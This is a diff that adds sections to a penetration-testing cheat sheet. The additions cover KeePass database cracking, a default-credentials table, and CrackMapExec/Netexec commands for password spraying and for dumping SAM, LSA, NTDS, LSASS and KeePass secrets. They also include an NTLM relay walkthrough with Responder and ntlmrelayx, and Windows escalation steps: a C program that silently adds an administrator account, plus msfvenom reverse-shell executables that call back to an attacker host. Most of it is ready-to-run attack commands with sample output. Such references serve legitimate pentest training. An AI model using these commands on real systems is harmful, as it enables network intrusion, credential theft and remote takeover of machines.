@@ -93,19 +93,17 @@
    - [Hydra](#hydra)
    - [John The Ripper](#john-the-ripper)
    - [Hashcat](#hashcat)
-8. [Common Credentials](#common-credentials)
-9. [CrackMapExec](#crackmapexec)
-10. [Netexec](#netexec)
+8. [Keepass](#keepass)
+9. [Common Credentials](#common-credentials)
+10. [CrackMapExec](#crackmapexec)
+11. [Netexec](#netexec)
     - [Password Spraying](#password-spraying)
-    - [SMB](#smb)
-    - [FTP](#ftp)
-    - [LDAP](#ldap)
-    - [MSSQL](#mssql)
     - [Secrets Dump](#secrets-dump)
-11. [Escalation](#escalation)
+12. [NTLM relay attack](#ntlm-relay-attack)
+13. [Escalation](#escalation)
     - [Windows](#windows)
     - [Linux](#linux)
-12. [Active Directory](#active-directory)
+14. [Active Directory](#active-directory)
     - [Basic Enumeration](#basic-enumeration)
     - [GPO Abuse](#gpo-abuse)
     - [AS-REP Roasting](#as-rep-roasting)
@@ -116,14 +114,14 @@
     - [Service Binary Hijacking](#service-binary-hijacking)
     - [DLL Hijacking](#dll-hijacking)
     - [DCSync](#dcsync)
-13. [Useful Privileges](#useful-privileges)
-14. [File Transferring](#file-transferring)
-15. [Reverse Shells](#reverse-shells)
-16. [Port Forwarding](#port-forwarding)
+15. [Useful Privileges](#useful-privileges)
+16. [File Transferring](#file-transferring)
+17. [Reverse Shells](#reverse-shells)
+18. [Port Forwarding](#port-forwarding)
     - [Chisel](#chisel)
     - [SSH](#ssh)
     - [Ligolo-ng](#ligolo-ng) 
-18. [Various Tools](#various-tools)
+19. [Various Tools](#various-tools)
     - [Mimikatz](#mimikatz)
     - [PowerView](#powerview)
     - [PowerUp](#powerup)
@@ -4874,3 +4872,2088 @@ URLs become:
 | **14. Remove Cracked Hashes** | `hashcat -m 0 hashes.txt --show --left` |
 | **15. Help and Usage Information** | `hashcat -h`<br>Alternative usage: `hashcat --help` |
 
+---
+
+## Keepass
+
+1. ### Search for KeePass database (.kdbx) on Windows
+> ```powershell
+> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+> ```
+2. Cracking KeePass Database
+- ### Convert KeePass database to John format
+> ```bash
+> keepass2john <Database.kdbx> > keepass.hash
+> # Remember to delete the first "'word':" that says 'Database:'; it should look like this:
+> # $keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2...... INSTEAD OF Database:$keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2......
+> # Crack KeePass hash using Hashcat (the rule is optional)
+> hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
+> ```
+3. Opening KeePass Database (after cracking it)
+- ### Open the tool
+> ```bash
+> kpcli --kdb=Database.kdbx
+> # Navigate to the desired database and folder with cd [folder]
+> cd Database/
+> # Show contents of database
+> ls
+> # Show entries information
+> show [-f] [-a] <entry_id or entry_path>
+> # Show a specific field detail of an entry: (example) get 'BACKUP Machine SSH Key' Pass or get 0 Pass
+> get <entry_path or entry_id> <field_name>
+> ```
+
+---
+
+## Common Credentials
+
+| **Description**                              | **Credentials**             |
+|----------------------------------------------|-----------------------------|
+| **Default root credentials**                 | root:root                   |
+| **Common admin credentials for email accounts** | admin@example.com:admin    |
+| **Standard admin/admin credentials**         | admin:admin                 |
+| **Credentials matching the box name (e.g., a target machine's name)** | USERK:USERK                |
+| **Credentials found using exiftool or similar methods** | cassie:cassie              |
+| **Standard admin/password credentials**      | admin:password              |
+| **Admin credentials with simple numeric password** | admin:1234               |
+| **Default admin credentials for Windows systems** | administrator:admin     |
+| **Common admin credentials with variations** | admin:admin123             |
+| **Default guest credentials for various systems** | guest:guest               |
+| **Basic user credentials**                   | user:user                   |
+| **Test account credentials**                 | test:test                   |
+| **Default support account credentials**      | support:support             |
+| **Common manager credentials**               | manager:manager             |
+| **Default operator credentials**             | operator:operator           |
+| **Default service account credentials**      | service:service             |
+| **Default PostgreSQL credentials**           | postgres:postgres           |
+| **Default MySQL credentials**                | mysql:mysql                 |
+
+---
+
+## Crackmapexec
+
+| **Description**                                | **Command**                                                                                                    |
+|------------------------------------------------|----------------------------------------------------------------------------------------------------------------|
+| **1. Basic SMB Enumeration**                   | `crackmapexec smb <target>`                                                                                   |
+| **2. Credential Validation**                   | `crackmapexec smb <target> -u <username> -p <password>`                                                        |
+| **3. Pass-the-Hash Authentication**            | `crackmapexec smb <target> -u <username> -H <ntlm_hash>`                                                      |
+| **4. Credential Spray Attack**                 | `crackmapexec smb <target> -u users.txt -p <password>`                                                        |
+| **5. Password Spray Attack**                   | `crackmapexec smb <target> -u users.txt -p passwords.txt`                                                     |
+| **6. Execute Commands**                        | `crackmapexec smb <target> -u <username> -p <password> -x "whoami"`                                           |
+| **7. Execute PowerShell Commands**             | `crackmapexec smb <target> -u <username> -p <password> -X "Get-Process"`                                      |
+| **8. Dump SAM Database**                       | `crackmapexec smb <target> -u <username> -p <password> --sam`                                                 |
+| **9. Dump LSA Secrets**                        | `crackmapexec smb <target> -u <username> -p <password> --lsa`                                                 |
+| **10. Dump NTDS.dit**                          | `crackmapexec smb <target> -u <username> -p <password> --ntds`                                                |
+| **11. Enumerate Shares**                       | `crackmapexec smb <target> -u <username> -p <password> --shares`                                              |
+| **12. Enumerate Logged Users**                 | `crackmapexec smb <target> -u <username> -p <password> --sessions`                                            |
+| **13. Enumerate Local Users**                  | `crackmapexec smb <target> -u <username> -p <password> --users`                                               |
+| **14. Enumerate Local Groups**                 | `crackmapexec smb <target> -u <username> -p <password> --groups`                                              |
+| **15. Enumerate Domain Users**                 | `crackmapexec ldap <target> -u <username> -p <password> --users`                                              |
+| **16. Spider Shares**                          | `crackmapexec smb <target> -u <username> -p <password> -M spider_plus`                                        |
+| **17. Execute Mimikatz Module**                | `crackmapexec smb <target> -u <username> -p <password> -M mimikatz`                                           |
+| **18. BloodHound Data Collection**             | `crackmapexec ldap <target> -u <username> -p <password> -M bloodhound`                                        |
+| **19. WinRM Command Execution**                | `crackmapexec winrm <target> -u <username> -p <password> -x "hostname"`                                       |
+| **20. MSSQL Query Execution**                  | `crackmapexec mssql <target> -u <username> -p <password> -q "SELECT @@version"`                              |
+| **21. List Available Modules**                 | `crackmapexec smb -L`                                                                                         |
+| **22. Subnet Scanning**                        | `crackmapexec smb 192.168.1.0/24`                                                                             |
+| **23. Continue on Success**                    | `crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success`                               |
+
+**Examples**
+
+| **Command**                        | **Example Usage**                                                               | **Function**                                        | **Output Example**                                                                                       |
+|------------------------------------|----------------------------------------------------------------------------------|----------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
+| **Basic Enumeration**              | `crackmapexec smb <IP Address>`                                                  | Enumerates SMB information.                        | `SMB <IP Address> 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)` |
+| **Valid Credentials**              | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd`                            | Validates credentials.                             | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`                                       |
+| **Invalid Credentials**            | `crackmapexec smb <IP Address> -u admin -p WrongPass`                           | Tests invalid credentials.                         | `SMB <IP Address> 445 DC01 [-] CORP.LOCAL\admin:WrongPass STATUS_LOGON_FAILURE`                          |
+| **Pass-the-Hash**                  | `crackmapexec smb <IP Address> -u admin -H fc525c9683e8fe067095ba2ddc971889`     | Authenticates with hash.                           | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)`                |
+| **Password Spray**                 | `crackmapexec smb <IP Address> -u users.txt -p Password123`                     | Sprays password across users.                      | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\john:Password123`                                              |
+| **Command Execution**              | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -x whoami`                  | Executes command remotely.                         | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`                                       |
+| **PowerShell Exec**                | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -X "Get-Host"`               | Executes PowerShell command.                       | `SMB <IP Address> 445 DC01 Name : ConsoleHost Version : 5.1.17763.1007`                                 |
+| **Dump SAM**                       | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --sam`                      | Dumps SAM database.                                | `SMB <IP Address> 445 DC01 [+] Dumping SAM hashes Administrator:500:aad3b435b51404ee...`                 |
+| **Dump LSA**                       | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --lsa`                      | Extracts LSA secrets.                              | `SMB <IP Address> 445 DC01 [+] Dumping LSA secrets CORP.LOCAL\svc_backup:$DCC2$...`                       |
+| **Dump NTDS**                      | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --ntds`                     | Extracts domain hashes.                            | `SMB <IP Address> 445 DC01 [+] Dumping NTDS.dit Administrator:500:aad3b435b51404ee...`                   |
+| **Enumerate Shares**               | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --shares`                   | Lists SMB shares.                                  | `SMB <IP Address> 445 DC01 ADMIN$ Disk Remote Admin SMB <IP Address> 445 DC01 C$ Disk Default share`      |
+| **Logged Users**                   | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --sessions`                 | Shows logged-in users.                             | `SMB <IP Address> 445 DC01 CORP.LOCAL\john (Active: 2h 15m) SMB <IP Address> 445 DC01 CORP.LOCAL\admin`    |
+| **Local Users**                    | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --users`                    | Lists local users.                                 | `SMB <IP Address> 445 DC01 Administrator SMB <IP Address> 445 DC01 Guest`                                 |
+| **Local Groups**                   | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --groups`                   | Lists local groups.                                | `SMB <IP Address> 445 DC01 Administrators SMB <IP Address> 445 DC01 Remote Desktop Users`                  |
+| **Domain Users**                   | `crackmapexec ldap <IP Address> -u admin -p P@ssw0rd --users`                   | Enumerates AD users.                               | `LDAP <IP Address> 389 DC01 john.doe LDAP <IP Address> 389 DC01 jane.smith`                               |
+| **Spider Module**                  | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -M spider_plus`             | Spiders shares for files.                          | `SMB <IP Address> 445 DC01 [+] Found: \\<IP Address>\Share\passwords.txt`                                 |
+| **Mimikatz Module**                | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -M mimikatz`                | Executes Mimikatz.                                  | `SMB <IP Address> 445 DC01 [+] john : P@ssw0rd123 SMB <IP Address> 445 DC01 [+] admin : SuperSecret!`     |
+| **BloodHound**                      | `crackmapexec ldap <IP Address> -u admin -p P@ssw0rd -M bloodhound`             | Collects BloodHound data.                          | `LDAP <IP Address> 389 DC01 [+] Collecting data for BloodHound LDAP <IP Address> 389 DC01 [+] Data saved to: bloodhound_data.zip` |
+| **WinRM Execution**                 | `crackmapexec winrm <IP Address> -u admin -p P@ssw0rd -x hostname`              | Uses WinRM for execution.                          | `WINRM <IP Address> 5985 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!) WINRM <IP Address> 5985 DC01 DC01`     |
+| **MSSQL Query**                     | `crackmapexec mssql <IP Address> -u sa -p P@ssw0rd -q "SELECT @@version"`       | Executes SQL query.                                | `MSSQL <IP Address> 1433 SQL01 Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`                             |
+| **List Modules**                    | `crackmapexec smb -L`                                                            | Lists available modules.                           | `[*] mimikatz Executes Mimikatz [*] spider_plus Spiders shares for files [*] bloodhound Collects data for BloodHound` |
+| **Subnet Scan**                     | `crackmapexec smb <IP Address>/24`                                               | Scans entire subnet.                               | `SMB <IP Address> 445 DC01 [*] Windows 10.0 Build 17763 SMB <IP Address> 445 SQL01 [*] Windows Server 2019` |
+| **Continue Success**                 | `crackmapexec smb <IP Address> -u users.txt -p Pass123 --continue-on-success`    | Continues after success.                           | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\john:Pass123 SMB <IP Address> 445 DC01 [+] CORP.LOCAL\jane:Pass123` |
+| **Admin Check**                     | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd`                            | Checks for admin access.                           | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`                                        |
+| **Gen Relay List**                  | `crackmapexec smb <IP Address>/24 --gen-relay-list targets.txt`                  | Generates relay target list.                       | `[+] Generating relay list... [+] 5 targets saved to targets.txt`                                         |
+
+---
+
+## Netexec
+
+**Enumeration**
+
+| **Command**                             | **Example Usage**                                                                 | **Function**                            |
+|-----------------------------------------|------------------------------------------------------------------------------------|----------------------------------------|
+| **Initial Enumeration**                 | `netexec smb <target>`                                                            | Performs basic SMB enumeration.        |
+| **Null Authentication**                 | `netexec smb <target> -u '' -p ''`                                                 | Attempts SMB null authentication.      |
+| **Guest Authentication**                | `netexec smb <target> -u 'guest' -p ''`                                           | Attempts SMB guest authentication.     |
+| **List Shares**                         | `netexec smb <target> -u '' -p '' --shares`                                        | Lists available SMB shares.            |
+|                                         | `netexec smb <target> -u [username] -p [password] --shares`                        | Lists SMB shares with valid credentials.|
+|                                         | `netexec smb <target> --shares --policies`                                         | Lists shares and their associated policies.|
+| **List Groups**                         | `netexec smb <target> --groups`                                                   | Lists SMB groups on the target.        |
+| **List Usernames**                      | `netexec smb <target> -u '' -p '' --users`                                         | Lists SMB users with null credentials. |
+|                                         | `netexec smb <target> -u [username] -p [password] --users`                         | Lists SMB users with valid credentials.|
+|                                         | `netexec smb <target> -u '' -p '' --rid-brute`                                     | Attempts RID brute force on SMB users. |
+|                                         | `netexec smb <target> -u '' -p '' --rid-brute --rid-range 500-1100`                | Brute forces a range of RIDs.          |
+
+
+## Password Spraying
+
+| **Command**                                                        | **Example Usage**                                                                                               | **Function**                                                                      |
+|--------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
+| **Password Formatting for Special Characters**                     | `netexec smb <target> -u [username] -p '[P@$$w0rd!]'`                                                             | Format passwords with special characters in single quotes to avoid shell issues. |
+|                                                                    | `netexec smb <target> -u [username] -p 'password with spaces'`                                                    | Formats passwords with spaces in single quotes.                                  |
+| **Password Spraying**                                              | `netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt`                                            | Uses a list of usernames and passwords for password spraying.                    |
+|                                                                    | `netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth`                               | Password spraying with local authentication.                                    |
+|                                                                    | `netexec [protocol] [target(s)] -u username1 -p password1 password2`                                             | Specify multiple passwords to try.                                              |
+|                                                                    | `netexec [protocol] [target(s)] -u username1 username2 -p password1`                                            | Use multiple usernames and a single password.                                   |
+| **Using NTLM Hashes**                                              | `netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt`                                          | Use NTLM hashes for authentication.                                             |
+|                                                                    | `netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth`                            | Authenticate with NTLM hashes and use local authentication.                     |
+| **SMB Specific**                                                   | `netexec smb <target> -u [usernames].txt -p [password] --continue-on-success`                                    | SMB password spraying with continue-on-success.                                 |
+|                                                                    | `netexec smb <target> -u [usernames].txt -p [passwords].txt --no-bruteforce --continue-on-success`               | SMB password spraying without brute-forcing.                                    |
+| **SSH**                                                            | `netexec ssh <target> -u [username] -p [password] --continue-on-success`                                         | SSH password spraying with continue-on-success.                                 |
+| **Password Spraying Without Bruteforce**                           | `netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce`                           | Password spraying without brute-force, useful for protocols like WinRM and MSSQL.|
+|                                                                    | `netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce`                         | Password spraying with NTLM hashes without brute-force.                         |
+| **Local Authentication**                                           | `netexec smb <target> -u [username] -p '[password]' --local-auth`                                                | Local authentication with a password.                                           |
+|                                                                    | `netexec smb <target> -u [username] -H '[LM:NT]' --local-auth`                                                  | Local authentication using LM and NT hashes.                                   |
+|                                                                    | `netexec smb <target> -u [username] -H '[NTHASH]' --local-auth`                                                 | Local authentication with NTHASH.                                               |
+| **Using Kerberos**                                                 | `netexec smb <target> -u [username] -p [password] -k`                                                            | Use Kerberos tickets for authentication when suspected available.               |
+
+**Other Useful Commands**
+
+| **Command**                                                      | **Example Usage**                                                                 | **Function**                                                                 |
+|------------------------------------------------------------------|------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
+| **SMB Commands**                                                 |                                                                                    |                                                                             |
+| **All In One**                                                   | `netexec smb <target> -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol` | Runs multiple SMB enumeration and information gathering options.            |
+| **Spider_plus Module**                                           | `netexec smb <target> -u [username] -p [password] -M spider_plus`                  | Runs the Spider_plus module to search SMB shares for files.                  |
+| **List Shares**                                                  | `netexec smb <target> -u '' -p '' --shares`                                       | Lists SMB shares on the target.                                              |
+| **List Shares (With Authentication)**                            | `netexec smb <target> -u [username] -p [password] --shares`                        | Lists SMB shares after authenticating.                                       |
+| **List Shares (With Policies)**                                  | `netexec smb <target> --shares --policies`                                        | Lists SMB shares with policies.                                             |
+| **List Groups**                                                  | `netexec smb <target> --groups`                                                   | Lists SMB groups on the target system.                                       |
+| **List Usernames**                                               | `netexec smb <target> -u '' -p '' --users`                                        | Lists usernames on the target system.                                       |
+| **List Usernames (With Authentication)**                         | `netexec smb <target> -u [username] -p [password] --users`                         | Lists usernames after authenticating.                                        |
+| **RID Brute Force**                                              | `netexec smb <target> -u '' -p '' --rid-brute`                                    | Performs RID brute forcing on the target.                                    |
+| **RID Brute Force (With Range)**                                 | `netexec smb <target> -u '' -p '' --rid-brute --rid-range 500-1100`                | Performs RID brute forcing with a specified range.                           |
+| **FTP Commands**                                                 |                                                                                    |                                                                             |
+| **List Folders and Files**                                       | `netexec ftp <target> -u [username] -p [password] --ls`                            | Lists folders and files in the FTP server.                                   |
+| **List Files Inside a Folder**                                   | `netexec ftp <target> -u [username] -p [password] --ls folder_name`                | Lists files inside a specific folder on the FTP server.                      |
+| **Retrieve a Specific File**                                     | `netexec ftp <target> -u [username] -p [password] --ls folder_name --get file_name` | Retrieves a specific file from a folder on the FTP server.                   |
+| **MSSQL Commands**                                               |                                                                                    |                                                                             |
+| **Authentication**                                               | `netexec mssql <target> -u [username] -p [password]`                               | Authenticates to an MSSQL server with a given username and password.         |
+| **Execute Commands Using xp_cmdshell**                           | `netexec mssql <target> -u [username] -p [password] -x [command_to_execute]`      | Executes a command on an MSSQL server using xp_cmdshell.                     |
+| **Get a File**                                                   | `netexec mssql <target> -u [username] -p [password] --get-file output_file target_file` | Downloads a file from the MSSQL server.                                     |
+| **LDAP Commands**                                                |                                                                                    |                                                                             |
+| **Enumerate Users Using LDAP**                                   | `netexec ldap <target> -u '' -p '' --users`                                       | Enumerates users in the LDAP directory.                                      |
+| **All In One (LDAP)**                                            | `netexec ldap <target> -u [username] -p [password] --trusted-for-delegation --[password]-not-required --admin-count --users --groups` | Runs multiple LDAP enumeration options.                                      |
+| **Kerberoast**                                                   | `netexec ldap <target> -u [username] -p [password] --kerberoasting kerb.txt`      | Performs Kerberoasting to extract service tickets from Active Directory.     |
+| **ASREProast**                                                   | `netexec ldap <target> -u [username] -p [password] --asreproast asrep.txt`        | Performs ASREProast to extract TGTs for password hashes from Active Directory.|
+| **BloodHound**                                                   | `netexec ldap <target> -u [username] -p [password] -M bloodhound`                 | Collects BloodHound data from Active Directory for analysis.                 |
+| **Authentication (LDAP)**                                        | `netexec ldap <target> -u [username] -p [password]`                               | Authenticates to an LDAP server with a given username and password.          |
+
+## Secrets Dump
+
+| **Command**                                        | **Example Usage**                                                                                                    | **Function**                        |
+|----------------------------------------------------|------------------------------------------------------------------------------------------------------------------------|-------------------------------------|
+| **Dump SAM**                                       | `nxc smb <target> -u [username] -p [password] --sam`                                                                   | Dumps SAM hashes.                   |
+| **Dump LSA Secrets**                               | `netexec smb <target> -u [username] -p [password] --local-auth --lsa`                                                  | Dumps LSA secrets.                  |
+| **Dump NTDS.dit**                                  | `netexec smb <target> -u [username] -p [password] --ntds`                                                              | Dumps NTDS.dit (AD hashes).         |
+| **Dump LSASS**                                     |                                                                                                                        |                                     |
+| **Using Lsassy**                                   | `nxc smb <target> -u [username] -p [password] -M lsassy`                                                                | Dumps LSASS creds with Lsassy.      |
+| **Using Nanodump**                                 | `nxc smb <target> -u [username] -p [password] -M nanodump`                                                              | Dumps LSASS creds with Nanodump.    |
+| **Using Mimikatz (Deprecated)**                    | `nxc smb <target> -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"'` | Dumps LSASS creds or DCSync.        |
+| **gMSA**                                           |                                                                                                                        |                                     |
+| **Convert gMSA ID**                                | `netexec ldap <target> -u [username] -p [password] --gmsa-convert-id id`                                               | Converts gMSA ID.                   |
+| **Decrypt gMSA LSA Secrets**                       | `netexec ldap <domain> -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account`                                    | Decrypts gMSA LSA secrets.         |
+| **Group Policy Preferences (GPP)**                 | `netexec smb <target> -u [username] -p [password] -M gpp_[password]`                                                   | Dumps GPP passwords.                |
+| **Dump LAPS v1 and v2 Passwords**                  | `netexec smb <target> -u [username] -p [password] --laps`                                                               | Dumps LAPS passwords.               |
+| **Dump DPAPI Credentials**                         | `netexec smb <target> -u [username] -p [password] --laps --dpapi`                                                       | Dumps DPAPI credentials.            |
+| **Dump WiFi Credentials**                          | `netexec smb <target> -u [username] -p [password] -M wifi`                                                              | Dumps WiFi credentials.             |
+| **Dump KeePass**                                   |                                                                                                                        |                                     |
+| **Discover KeePass Installation**                  | `nxc smb <target> -u [username] -p [password] -M keepass_discover`                                                      | Discovers KeePass installation.     |
+| **Trigger KeePass for Master Password Extraction** | `nxc smb <target> -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"`   | Extracts KeePass master password.   |
+
+
+**Other Useful Models**
+
+| **Command**                                      | **Example Usage**                                                                                                  | **Function**                                   |
+|--------------------------------------------------|----------------------------------------------------------------------------------------------------------------------|------------------------------------------------|
+| **Webdav**                                       | `netexec smb <IP Address> -u [username] -p [password] -M webdav`                                                     | Checks if the WebClient service is running.    |
+| **Veeam**                                        | `netexec smb <target> -u [username] -p [password] -M veeam`                                                          | Extracts credentials from Veeam SQL Database.  |
+| **Slinky**                                       | `netexec smb <IP Address> -u [username] -p [password] -M slinky`                                                     | Creates Windows shortcuts with UNC path.       |
+| **NTDSutil**                                     | `netexec smb <IP Address> -u [username] -p [password] -M ntdsutil`                                                   | Dumps NTDS using ntdsutil.                    |
+| **LDAP-Checker**                                 | `netexec ldap <target> -u [username] -p [password] -M ldap-checker`                                                  | Checks if LDAP signing and binding are required. |
+| **Zerologon**                                    | `netexec smb <target> -u [username] -p [password] -M zerologon`                                                     | Checks if the DC is vulnerable to Zerologon.   |
+| **PetitPotam**                                   | `netexec smb <target> -u [username] -p [password] -M petitpotam`                                                    | Checks if the DC is vulnerable to PetitPotam.  |
+| **Nopac**                                        | `netexec smb <target> -u [username] -p [password] -M nopac`                                                         | Checks if the DC is vulnerable to NOPAC.       |
+| **MachineAccountQuota**                          | `netexec ldap <target> -u [username] -p [password] -M maq`                                                          | Checks the MachineAccountQuota.                |
+| **ADCS Enumeration**                             | `netexec ldap <target> -u [username] -p [password] -M adcs`                                                         | Performs ADCS enumeration.                     |
+| **Retrieve MSOL Account Password**               | `netexec smb <target> -u [username] -p [password] -M msol`                                                          | Retrieves MSOL account password.               |
+
+---
+
+## NTLM relay attack
+
+1. Check for hosts that have SMB signing disabled, and if so capture the NTLM and perform an NTLM Relay Attack:
+
+       Identify if Host is Vulnerable:
+
+> ```bash
+> netexec smb [target(s)] --gen-relay-list relay.txt
+> 
+> # Alternative with Nmap
+> nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]
+> ```
+
+### Expected Results
+SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
+SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
+SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
+SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
+...SNIP...
+
+> ```bash
+> cat relay_list.txt
+> 192.168.1.111
+> 192.168.1.117
+> ```
+
+2. Start Responder Server
+
+> ```bash
+> sudo responder -I eth0
+> ```
+
+3. Perform Relay Attack: by using the captured hashes in Responder (if applicable).
+
+> ```bash
+> impacket-ntlmrelayx -tf relay.txt -smb2support
+> ```
+
+4. Perform Actions on Objective: access shares or execute commands or do pass-the-hash attacks or try to crack the NTLM hash, this is now whatever you want to do.
+
+---
+
+## Escalation
+
+## Windows
+
+**Basic Commands**
+
+| **Command**                                                             | **Example Usage**                                                                                              |
+|-------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------|
+| **Displays current user and hostname**                                  | `whoami`                                                                                                       |
+| **Lists all local users**                                               | `Get-LocalUser`                                                                                                 |
+| **Lists all local groups**                                              | `Get-LocalGroup`                                                                                               |
+| **Lists local group members**                                           | `Get-LocalGroupMember -GroupName [GroupName]`                                                                   |
+| **Displays detailed OS information**                                    | `systeminfo`                                                                                                   |
+| **Displays detailed network configuration**                              | `ipconfig /all`                                                                                               |
+| **Shows routing table**                                                 | `route print`                                                                                                  |
+| **Displays network connections and listening ports**                    | `netstat -ano`                                                                                                 |
+| **Lists installed 32-bit applications**                                 | `Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"`             |
+| **Filters to show only application names**                              | `Select-Object -Property DisplayName`                                                                           |
+| **Lists installed 64-bit applications**                                 | `Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"`                         |
+| **Lists all running processes**                                         | `Get-Process`                                                                                                  |
+| **Displays process names and paths**                                    | `Select-Object -Property ProcessName, Path`                                                                    |
+| **Lists services and their associated accounts**                        | `Get-WmiObject -Class Win32_Service | Select-Object Name, StartName`                                           |
+| **Displays scheduled tasks and their status**                           | `Get-ScheduledTask | Select-Object TaskName, TaskPath, State`                                                   |
+| **Lists members of the local Administrators group**                     | `Get-LocalGroupMember -GroupName "Administrators"`                                                             |
+| **Shows all drives and mounted volumes, including network shares**      | `Get-PSDrive -PSProvider FileSystem`                                                                            |
+| **Displays the version of PowerShell in use**                           | `$PSVersionTable.PSVersion`                                                                                   |
+| **Enumerates everything the Users folder has**                          | `Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue`                       |
+| **Searching for Password Manager Databases**                            | `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`                         |
+| **Searching for sensitive information in the XAMPP directory**          | `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`               |
+| **Finding unusual files and directories**                               | `Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue`          |
+| **Finding files with SYSTEM or Administrators group permissions**       | `Get-ChildItem -Path [Path] -File -Recurse | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }}` |
+| **Finding large files**                                                | `Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length`                       |
+| **Finding executable files**                                            | `Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue`          |
+| **Finding directories writable by all users**                           | `Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }}` |
+| **Using Runas to execute CMD as a different user**                      | `runas /user:[Domain\Username] cmd`                                                                              |
+
+**Service Binary Hijacking**
+
+1. Check Running Services
+### Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
+> ```powershell
+> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
+> ```
+
+2. Review Permissions of a Service
+> ```cmd
+> icacls "C:\Path\To\ServiceBinary.exe"
+> ```
+
+3. Obtain Startup Type of a Service
+> ```powershell
+> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
+> ```
+
+4. Creating an Executable That Adds a New Administrator User
+> ```c
+> #include <stdlib.h>
+>
+> int main ()
+> {
+>   system("net user emma Password123! /add");
+>   system("net localgroup administrators emma /add");
+>   return 0;
+> }
+> ```
+> ### Cross-Compile the C Code to a 64-bit Application
+> ```bash
+> x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+> ```
+
+5. Creating an Executable that is a Reverse Shell
+
+- ### For 64-bit executable
+> ```bash
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
+>```
+
+- ### For 32-bit executable
+> ```bash
+> msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
+> ```
+
